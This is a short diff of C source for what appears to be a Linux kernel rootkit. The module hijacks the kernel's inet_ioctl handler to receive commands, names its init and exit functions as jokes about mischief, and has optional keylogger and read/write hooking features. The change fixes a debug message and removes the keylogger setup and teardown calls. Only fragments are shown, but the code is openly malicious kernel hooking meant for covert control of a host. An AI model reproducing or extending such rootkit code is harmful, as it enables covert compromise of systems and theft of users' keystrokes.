@@ -924,7 +924,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
                 break;
             case 20:
-                DEBUG("Killing Module...");
+                DEBUG("Killing Module...\n");
                 // todo: clean this up... this is ctrl-c ctrl-v from 
                 // mischief_managed
                 #if defined(_CONFIG_HOOKRW_)
@@ -1004,10 +1004,6 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     hijack_start(inet_ioctl, &n_inet_ioctl);
 
-    #if defined(_CONFIG_KEYLOGGER_)
-    keylogger_init();
-    #endif
-
     #if defined(_CONFIG_HOOKRW_)
     hookrw_init();
     #endif
@@ -1041,10 +1037,6 @@ static void __exit mischief_managed ( void )
     hookrw_exit();
     #endif
 
-    #if defined(_CONFIG_KEYLOGGER_)
-    keylogger_exit();
-    #endif
-     
     #if defined(_CONFIG_HOOKTS_)
     hookts_exit();
     #endif 
